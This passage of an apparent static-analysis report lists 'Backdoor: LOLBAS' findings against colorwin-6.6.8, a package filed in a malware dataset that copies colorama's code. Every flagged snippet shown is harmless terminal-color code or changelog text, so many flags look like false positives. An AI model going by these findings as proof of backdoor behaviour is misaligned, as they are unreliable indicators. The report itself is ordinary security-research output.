                    "text": "`Github for source <https://github.com/tartley/colorama>`_ |\r\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\r\n\r\nIf you find Colorama useful, please |donate| to the authors. Thank you!\r\n\r\n\r\nInstallation\r\n",
                    "rendered": {
                      "text": "`Github for source <https://github.com/tartley/colorama>`_ |\r\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\r\n\r\nIf you find Colorama useful, please |donate| to the authors. Thank you!\r\n\r\n\r\nInstallation\r\n",
                      "markdown": "``Github for source <https://github.com/tartley/colorama>`_ |\r\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\r\n\r\nIf you find Colorama useful, please |donate| to the authors. Thank you!\r\n\r\n\r\nInstallation\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/setup.py"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 33,
                  "endLine": 24,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n",
                    "rendered": {
                      "text": "    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n",
                      "markdown": "`    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansitowin32.py"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 75,
                  "endLine": 78,
                  "endColumn": 84,
                  "snippet": {
                    "text": "    sequences from the text, and if outputting to a tty, will convert them into\n    win32 function calls.\n    '''\n    ANSI_CSI_RE = re.compile('\\001?\\033\\\\[((?:\\\\d|;)*)([a-zA-Z])\\002?')   # Control Sequence Introducer\n    ANSI_OSC_RE = re.compile('\\001?\\033\\\\]([^\\a]*)(\\a)\\002?')             # Operating System Command\n\n    def __init__(self, wrapped, convert=None, strip=None, autoreset=False):\n",
                    "rendered": {
                      "text": "    sequences from the text, and if outputting to a tty, will convert them into\n    win32 function calls.\n    '''\n    ANSI_CSI_RE = re.compile('\\001?\\033\\\\[((?:\\\\d|;)*)([a-zA-Z])\\002?')   # Control Sequence Introducer\n    ANSI_OSC_RE = re.compile('\\001?\\033\\\\]([^\\a]*)(\\a)\\002?')             # Operating System Command\n\n    def __init__(self, wrapped, convert=None, strip=None, autoreset=False):\n",
                      "markdown": "`    sequences from the text, and if outputting to a tty, will convert them into\n    win32 function calls.\n    '''\n    ANSI_CSI_RE = re.compile('\\001?\\033\\\\[((?:\\\\d|;)*)([a-zA-Z])\\002?')   # Control Sequence Introducer\n    ANSI_OSC_RE = re.compile('\\001?\\033\\\\]([^\\a]*)(\\a)\\002?')             # Operating System Command\n\n    def __init__(self, wrapped, convert=None, strip=None, autoreset=False):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 127,
                  "startColumn": 65,
                  "endLine": 127,
                  "endColumn": 69,
                  "snippet": {
                    "text": "  * Split changelog out into separate file.\n0.2.2\n  * Fix bug which caused init() to raise, introduced in 0.2.1.\n  * Remove asserts which cause problems in various circumstances. At least\n    some users saw asserts fail on 'success' returned from win32 functions,\n    even though the win32 functions appear to have worked correctly.\n0.2.1\n",
                    "rendered": {
                      "text": "  * Split changelog out into separate file.\n0.2.2\n  * Fix bug which caused init() to raise, introduced in 0.2.1.\n  * Remove asserts which cause problems in various circumstances. At least\n    some users saw asserts fail on 'success' returned from win32 functions,\n    even though the win32 functions appear to have worked correctly.\n0.2.1\n",
                      "markdown": "`  * Split changelog out into separate file.\n0.2.2\n  * Fix bug which caused init() to raise, introduced in 0.2.1.\n  * Remove asserts which cause problems in various circumstances. At least\n    some users saw asserts fail on 'success' returned from win32 functions,\n    even though the win32 functions appear to have worked correctly.\n0.2.1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 44,
                  "endLine": 53,
                  "endColumn": 48,
                  "snippet": {
                    "text": "  * Fix issue #95: enable color when stderr is a tty but stdout is not\n0.3.7\n  * Fix issue #84: check if stream has 'closed' attribute before testing it\n  * Fix issue #74: objects might become None at exit\n0.3.6\n  * Fix issue #81: fix ValueError when a closed stream was used\n0.3.5\n",
                    "rendered": {
                      "text": "  * Fix issue #95: enable color when stderr is a tty but stdout is not\n0.3.7\n  * Fix issue #84: check if stream has 'closed' attribute before testing it\n  * Fix issue #74: objects might become None at exit\n0.3.6\n  * Fix issue #81: fix ValueError when a closed stream was used\n0.3.5\n",
                      "markdown": "`  * Fix issue #95: enable color when stderr is a tty but stdout is not\n0.3.7\n  * Fix issue #84: check if stream has 'closed' attribute before testing it\n  * Fix issue #74: objects might become None at exit\n0.3.6\n  * Fix issue #81: fix ValueError when a closed stream was used\n0.3.5\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 63,
                  "endLine": 146,
                  "snippet": {
                    "text": "0.1.18\n  * Fix README (no such attr as Fore.DEFAULT, etc), kindly reported by nodakai.\n0.1.17\n  * Prevent printing of garbage ANSI codes upon installing with pip\n0.1.16\n  * Re-upload to fix previous error. Make clean now removes old MANIFEST.\n0.1.15\n  * Completely broken. Distribution was empty due to leftover invalid MANIFEST\n",
                    "rendered": {
                      "text": "0.1.18\n  * Fix README (no such attr as Fore.DEFAULT, etc), kindly reported by nodakai.\n0.1.17\n  * Prevent printing of garbage ANSI codes upon installing with pip\n0.1.16\n  * Re-upload to fix previous error. Make clean now removes old MANIFEST.\n0.1.15\n  * Completely broken. Distribution was empty due to leftover invalid MANIFEST\n",
                      "markdown": "`0.1.18\n  * Fix README (no such attr as Fore.DEFAULT, etc), kindly reported by nodakai.\n0.1.17\n  * Prevent printing of garbage ANSI codes upon installing with pip\n0.1.16\n  * Re-upload to fix previous error. Make clean now removes old MANIFEST.\n0.1.15\n  * Completely broken. Distribution was empty due to leftover invalid MANIFEST\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 132,
                  "startColumn": 61,
                  "endLine": 132,
                  "endColumn": 69,
                  "snippet": {
                    "text": "    even though the win32 functions appear to have worked correctly.\n0.2.1\n  * Completely broken: I added a bug which caused init() to raise.\n  * Added some documentation for cursor positioning and clear screen to README.\n  * Add 'reinit' and 'deinit' functions, as suggested by Charles FOL and\n    Romanov DA.\n0.2\n",
                    "rendered": {
                      "text": "    even though the win32 functions appear to have worked correctly.\n0.2.1\n  * Completely broken: I added a bug which caused init() to raise.\n  * Added some documentation for cursor positioning and clear screen to README.\n  * Add 'reinit' and 'deinit' functions, as suggested by Charles FOL and\n    Romanov DA.\n0.2\n",
                      "markdown": "`    even though the win32 functions appear to have worked correctly.\n0.2.1\n  * Completely broken: I added a bug which caused init() to raise.\n  * Added some documentation for cursor positioning and clear screen to README.\n  * Add 'reinit' and 'deinit' functions, as suggested by Charles FOL and\n    Romanov DA.\n0.2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 40,
                  "endLine": 78,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    is already relative (CSI n A\\B\\C\\D)\n  * Fix Google Code issue #55 - erase_data fails on Python 3.x\n  * Fix Google Code issue #46 - win32.COORD definition missing\n  * Implement \\033[0J and \\033[1J (clear screen options)\n  * Fix default ANSI parameters\n  * Fix position after \\033[2J (clear screen)\n  * Add command shortcuts: colorama.Cursor, colorama.ansi.set_title,\n",
                    "rendered": {
                      "text": "    is already relative (CSI n A\\B\\C\\D)\n  * Fix Google Code issue #55 - erase_data fails on Python 3.x\n  * Fix Google Code issue #46 - win32.COORD definition missing\n  * Implement \\033[0J and \\033[1J (clear screen options)\n  * Fix default ANSI parameters\n  * Fix position after \\033[2J (clear screen)\n  * Add command shortcuts: colorama.Cursor, colorama.ansi.set_title,\n",
                      "markdown": "`    is already relative (CSI n A\\B\\C\\D)\n  * Fix Google Code issue #55 - erase_data fails on Python 3.x\n  * Fix Google Code issue #46 - win32.COORD definition missing\n  * Implement \\033[0J and \\033[1J (clear screen options)\n  * Fix default ANSI parameters\n  * Fix position after \\033[2J (clear screen)\n  * Add command shortcuts: colorama.Cursor, colorama.ansi.set_title,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/winterm.py"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 25,
                  "endLine": 163,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        else:\n            # invalid mode\n            return\n        # fill the entire screen with blanks\n        win32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n        # now set the buffer's attributes accordingly\n        win32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\n",
                    "rendered": {
                      "text": "        else:\n            # invalid mode\n            return\n        # fill the entire screen with blanks\n        win32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n        # now set the buffer's attributes accordingly\n        win32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\n",
                      "markdown": "`        else:\n            # invalid mode\n            return\n        # fill the entire screen with blanks\n        win32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n        # now set the buffer's attributes accordingly\n        win32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/winterm.py"
                },
                "region": {
                  "startLine": 135,
                  "startColumn": 25,
                  "endLine": 135,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        else:\n            # invalid mode\n            return\n        # fill the entire screen with blanks\n        win32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n        # now set the buffer's attributes accordingly\n        win32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\n",
                    "rendered": {
                      "text": "        else:\n            # invalid mode\n            return\n        # fill the entire screen with blanks\n        win32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n        # now set the buffer's attributes accordingly\n        win32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\n",
                      "markdown": "`        else:\n            # invalid mode\n            return\n        # fill the entire screen with blanks\n        win32.FillConsoleOutputCharacter(handle, ' ', cells_to_erase, from_coord)\n        # now set the buffer's attributes accordingly\n        win32.FillConsoleOutputAttribute(handle, self.get_attrs(), cells_to_erase, from_coord)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/winterm.py"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 3,
                  "endLine": 11,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    BLUE    = 1\n    GREEN   = 2\n    CYAN    = 3\n    RED     = 4\n    MAGENTA = 5\n    YELLOW  = 6\n    GREY    = 7\n",
                    "rendered": {
                      "text": "    BLUE    = 1\n    GREEN   = 2\n    CYAN    = 3\n    RED     = 4\n    MAGENTA = 5\n    YELLOW  = 6\n    GREY    = 7\n",
                      "markdown": "`    BLUE    = 1\n    GREEN   = 2\n    CYAN    = 3\n    RED     = 4\n    MAGENTA = 5\n    YELLOW  = 6\n    GREY    = 7\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/initialise.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 73,
                  "endLine": 19,
                  "endColumn": 77,
                  "snippet": {
                    "text": "\n\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\n\n\n",
                    "rendered": {
                      "text": "\n\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\n\n\n",
                      "markdown": "`\n\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 14,
                  "endLine": 46,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n        return CSI + str(y) + ';' + str(x) + 'H'\n\n\nclass AnsiFore(AnsiCodes):\n",
                    "rendered": {
                      "text": "    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n        return CSI + str(y) + ';' + str(x) + 'H'\n\n\nclass AnsiFore(AnsiCodes):\n",
                      "markdown": "`    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n        return CSI + str(y) + ';' + str(x) + 'H'\n\n\nclass AnsiFore(AnsiCodes):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 14,
                  "endLine": 44,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n        return CSI + str(y) + ';' + str(x) + 'H'\n\n",
                    "rendered": {
                      "text": "    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n        return CSI + str(y) + ';' + str(x) + 'H'\n\n",
                      "markdown": "`    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n        return CSI + str(y) + ';' + str(x) + 'H'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 14,
                  "endLine": 42,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n",
                    "rendered": {
                      "text": "    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n",
                      "markdown": "`    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n        return CSI + str(n) + 'D'\n    def POS(self, x=1, y=1):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 14,
                  "endLine": 40,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    def UP(self, n=1):\n        return CSI + str(n) + 'A'\n    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n",
                    "rendered": {
                      "text": "    def UP(self, n=1):\n        return CSI + str(n) + 'A'\n    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n",
                      "markdown": "`    def UP(self, n=1):\n        return CSI + str(n) + 'A'\n    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n        return CSI + str(n) + 'C'\n    def BACK(self, n=1):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 14,
                  "endLine": 38,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\nclass AnsiCursor(object):\n    def UP(self, n=1):\n        return CSI + str(n) + 'A'\n    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n",
                    "rendered": {
                      "text": "\nclass AnsiCursor(object):\n    def UP(self, n=1):\n        return CSI + str(n) + 'A'\n    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n",
                      "markdown": "`\nclass AnsiCursor(object):\n    def UP(self, n=1):\n        return CSI + str(n) + 'A'\n    def DOWN(self, n=1):\n        return CSI + str(n) + 'B'\n    def FORWARD(self, n=1):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 10,
                  "endLine": 22,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    return CSI + str(mode) + 'J'\n\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\n\n\nclass AnsiCodes(object):\n",
                    "rendered": {
                      "text": "    return CSI + str(mode) + 'J'\n\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\n\n\nclass AnsiCodes(object):\n",
                      "markdown": "`    return CSI + str(mode) + 'J'\n\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\n\n\nclass AnsiCodes(object):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 10,
                  "endLine": 19,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    return OSC + '2;' + title + BEL\n\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\n\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\n",
                    "rendered": {
                      "text": "    return OSC + '2;' + title + BEL\n\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\n\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\n",
                      "markdown": "`    return OSC + '2;' + title + BEL\n\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\n\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 10,
                  "endLine": 13,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\n\ndef code_to_chars(code):\n    return CSI + str(code) + 'm'\n\ndef set_title(title):\n    return OSC + '2;' + title + BEL\n",
                    "rendered": {
                      "text": "\n\ndef code_to_chars(code):\n    return CSI + str(code) + 'm'\n\ndef set_title(title):\n    return OSC + '2;' + title + BEL\n",
                      "markdown": "`\n\ndef code_to_chars(code):\n    return CSI + str(code) + 'm'\n\ndef set_title(title):\n    return OSC + '2;' + title + BEL\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 6,
                  "endLine": 7,
                  "endColumn": 4,
                  "snippet": {
                    "text": "This module generates ANSI character codes to printing colors to terminals.\nSee: http://en.wikipedia.org/wiki/ANSI_escape_code\n'''\n\nCSI = '\\033['\nOSC = '\\033]'\nBEL = '\\a'\n\n",
                    "rendered": {
                      "text": "This module generates ANSI character codes to printing colors to terminals.\nSee: http://en.wikipedia.org/wiki/ANSI_escape_code\n'''\n\nCSI = '\\033['\nOSC = '\\033]'\nBEL = '\\a'\n\n",
                      "markdown": "`This module generates ANSI character codes to printing colors to terminals.\nSee: http://en.wikipedia.org/wiki/ANSI_escape_code\n'''\n\nCSI = '\\033['\nOSC = '\\033]'\nBEL = '\\a'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 3,
                  "endLine": 73,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\nclass AnsiBack(AnsiCodes):\n    BLACK           = 40\n    RED             = 41\n    GREEN           = 42\n    YELLOW          = 43\n    BLUE            = 44\n",
                    "rendered": {
                      "text": "\nclass AnsiBack(AnsiCodes):\n    BLACK           = 40\n    RED             = 41\n    GREEN           = 42\n    YELLOW          = 43\n    BLUE            = 44\n",
